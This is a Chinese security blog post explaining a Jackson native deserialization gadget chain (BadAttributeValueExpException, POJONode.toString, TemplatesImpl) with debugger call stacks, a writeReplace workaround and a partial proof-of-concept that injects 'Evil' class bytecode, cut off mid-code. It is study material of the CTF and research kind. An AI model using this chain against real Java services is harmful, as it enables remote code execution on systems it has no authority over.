Object handler, @Nullable ModelAndView mv) throws Exception { System.out.println(\"postpostpostpostpost\"); } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws IOException { System.out.println(\"afterafterafterafter\"); } } 最后成功利用hhh\n题目附件：6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xTlBBUlhLLWNrWGNTQU9QVHlybGxLUT9wd2Q9ZmxhZyDmj5Dlj5bnoIE6IGZsYWc=（自行Base64解码） 参考：\nhttps://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload\nhttps://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD\n2023浙江大学生省赛初赛 secObj\n",
  "wordCount" : "5600",
  "inLanguage": "zh",
  "datePublished": "2024-11-14T20:01:23+08:00",
  "dateModified": "2024-11-14T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
                    <span>搜索🔍︎</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      jackson原生链
    </h1>
    <div class="post-meta"><span title='2024-11-14 20:01:23 +0800 CST'>2024-11-14</span>&nbsp;·&nbsp;12 分钟&nbsp;·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e7%8e%af%e5%a2%83" aria-label="环境">环境</a></li>
                    <li>
                        <a href="#0x01-writevalueasstring" aria-label="0x01 writeValueAsString">0x01 writeValueAsString</a></li>
                    <li>
                        <a href="#0x02-pojonode" aria-label="0x02 POJONode">0x02 POJONode</a></li>
                    <li>
                        <a href="#0x03-gadgets" aria-label="0x03 Gadgets">0x03 Gadgets</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-writereplace" aria-label="问题1 writeReplace()">问题1 writeReplace()</a></li></ul>
                        
                    <li>
                        <a href="#%e5%ad%98%e6%a1%a31-basejsonnode" aria-label="存档1 BaseJsonNode">存档1 BaseJsonNode</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e4%b8%8d%e7%a8%b3%e5%ae%9a" aria-label="0x04 不稳定">0x04 不稳定</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e8%a7%a3%e5%86%b3" aria-label="解决">解决</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x05-jdkdynamicaopproxy" aria-label="0x05 JdkDynamicAopProxy">0x05 JdkDynamicAopProxy</a></li>
                    <li>
                        <a href="#0x06-poc" aria-label="0x06 poc">0x06 poc</a></li>
                    <li>
                        <a href="#0x07-%e5%8f%a6%e4%b8%80%e7%a7%8d%e8%a7%a6%e5%8f%91tostring" aria-label="0x07 另一种触发tostring">0x07 另一种触发tostring</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-putval" aria-label="问题1 putVal">问题1 putVal</a></li>
                    <li>
                        <a href="#hsts-%e6%88%91%e7%9a%84%e7%a5%9e" aria-label="HSTS 我的神">HSTS 我的神</a></li></ul>
                        
                    <li>
                        <a href="#poc" aria-label="poc">poc</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h1 id="环境">环境<a hidden class="anchor" aria-hidden="true" href="#环境">#</a></h1>
<p>jackson版本太老的话，<code>POJONode</code>中代码会不对</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jackson-databind<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jackson-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jackson-annotations<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><h1 id="0x01-writevalueasstring">0x01 writeValueAsString<a hidden class="anchor" aria-hidden="true" href="#0x01-writevalueasstring">#</a></h1>
<p>这里我们jackson 原生链，利用点跟<code>writeValueAsString()</code>有关，他用来将<strong>java对象</strong><code>序列化</code>成<strong>json字符串</strong>，序列化的时候会<code>调用java对象的getter方法</code>，所以我们这里看下序列化的时候是怎么调用getter方法的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">_accessorMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="p">)</span><span class="w"> </span><span class="n">member</span><span class="p">.</span><span class="na">getMember</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p><strong>设置getter方法，调用栈</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">234</span><span class="p">,</span> <span class="n">BeanPropertyWriter</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buildWriter</span><span class="p">:</span><span class="mi">229</span><span class="p">,</span> <span class="n">PropertyBuilder</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_constructWriter</span><span class="p">:</span><span class="mi">791</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findBeanProperties</span><span class="p">:</span><span class="mi">583</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constructBeanSerializer</span><span class="p">:</span><span class="mi">368</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findBeanSerializer</span><span class="p">:</span><span class="mi">279</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_createSerializer2</span><span class="p">:</span><span class="mi">231</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">createSerializer</span><span class="p">:</span><span class="mi">165</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_createUntypedSerializer</span><span class="p">:</span><span class="mi">1385</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_createAndCacheUntypedSerializer</span><span class="p">:</span><span class="mi">1336</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findValueSerializer</span><span class="p">:</span><span class="mi">510</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findTypedValueSerializer</span><span class="p">:</span><span class="mi">713</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">serializeValue</span><span class="p">:</span><span class="mi">308</span><span class="p">,</span> <span class="n">DefaultSerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_configAndWriteValue</span><span class="p">:</span><span class="mi">3893</span><span class="p">,</span> <span class="n">ObjectMapper</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">writeValueAsString</span><span class="p">:</span><span class="mi">3207</span><span class="p">,</span> <span class="n">ObjectMapper</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span> <span class="n">JSTest</span> <span class="p">(</span><span class="n">jackson</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">_accessorMethod</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">_field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">bean</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="n">_accessorMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><strong>getter方法反射调用，只调用<code>无参方法</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getJack:31, Person2 (jackson)
</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
</span></span><span class="line"><span class="cl">serializeAsField:687, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">serializeFields:719, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
</span></span><span class="line"><span class="cl">serialize:155, BeanSerializer (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">_configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind)
</span></span><span class="line"><span class="cl">writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind)
</span></span><span class="line"><span class="cl">main:16, JSTest (jackson)
</span></span></code></pre></div><p>对比下调用栈，大概流程就是</p>
<p><code>writeValueAsString()</code>一直到=&gt;<code>DefaultSerializerProvider#serializeValue</code></p>
<ol>
<li>
<p>这里<code>findTypedValueSerializer()</code>会先对<code>Filed</code>和<code>Method</code>（包含setter和getter），进行初始化</p>
</li>
<li>
<p>在<code>_serialize()</code>反射调用这些<code>Filed</code>和<code>Method</code>（测试发现，<code>有属性的getter方法</code>和<code>没有属性的getter方法</code>都会被调用）</p>
</li>
</ol>
<p><img loading="lazy" src="../images//image-20241114104044722.png" alt="image-20241114104044722"  />
</p>
<p>调用的时候，在<code>BeanSerializerBase#serializeFields</code>会通过<code>for</code>需要根据前面<code>初始化的prop</code>调用<code>serializeAsField</code>，注意，这里<code>jack</code>也有自己prop尽管他没有属性，但是他有<code>getter</code>，前面赋值优先赋值给<code>Method</code>，所以他也有自己prop，最后调用<code>getJack()</code></p>
<p><img loading="lazy" src="../images//image-20241114105619470.png" alt="image-20241114105619470"  />
</p>
<p>作为Gadgets的一环，我们知道他的作用就是调用任意类getter方法嘛，无疑Gadgets后半段就是<code>TemplatesImpl.getOutputProperties()</code></p>
<h1 id="0x02-pojonode">0x02 POJONode<a hidden class="anchor" aria-hidden="true" href="#0x02-pojonode">#</a></h1>
<p><code>POJONode</code>的<code>toString</code>可以调用<code>writeValueAsString()</code>，且对象可控，我们怎么调用<code>toString</code>呢，这里不难想到利用CC5的<code>BadAttributeValueExpException</code>，那么Gadgets就完整啦</p>
<p><img loading="lazy" src="../images//image-20241114160159735.png" alt="image-20241114160159735"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">InternalNodeMapper#nodeToString
</span></span></code></pre></div><p><img loading="lazy" src="../images//image-20241114163137443.png" alt="image-20241114163137443"  />
</p>
<h1 id="0x03-gadgets">0x03 Gadgets<a hidden class="anchor" aria-hidden="true" href="#0x03-gadgets">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="na">readObject</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">POJONode</span><span class="p">.</span><span class="na">toString</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    	</span><span class="n">InternalNodeMapper</span><span class="err">#</span><span class="n">nodeToString</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="nf">writeValueAsString</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getOutputProperties</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><h3 id="问题1-writereplace">问题1 writeReplace()<a hidden class="anchor" aria-hidden="true" href="#问题1-writereplace">#</a></h3>
<p>我们满心欢喜构造好poc后，发现序列化的时就退出程序了，常规反序列化这个地方会调用<code>writeReplace()</code></p>
<p><img loading="lazy" src="../images//image-20241114163945086.png" alt="image-20241114163945086"  />
</p>
<p><code>writeReplace()</code>这里和<code>toString()</code>可以起到一样的效果，后面会调用到<code>writeValueAsBytes()</code>,后续会<code>提前</code>调用<code>getter方法</code>，然后报错中断</p>
<p><img loading="lazy" src="../images//image-20241114164222405.png" alt="image-20241114164222405"  />
</p>
<p><img loading="lazy" src="../images//image-20241114164445460.png" alt="image-20241114164445460"  />
</p>
<p><strong>解决：</strong></p>
<p>自构一个<code>BaseJsonNode</code>将<code>writeReplace()</code>删除  //这里应该是跟Classload加载的问题有关，后面留个坑</p>
<p>构造个一样路径的，然后就可以打成功啦</p>
<p><img loading="lazy" src="../images//image-20241114170156770.png" alt="image-20241114170156770"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">jackson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.NotFoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jackson</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
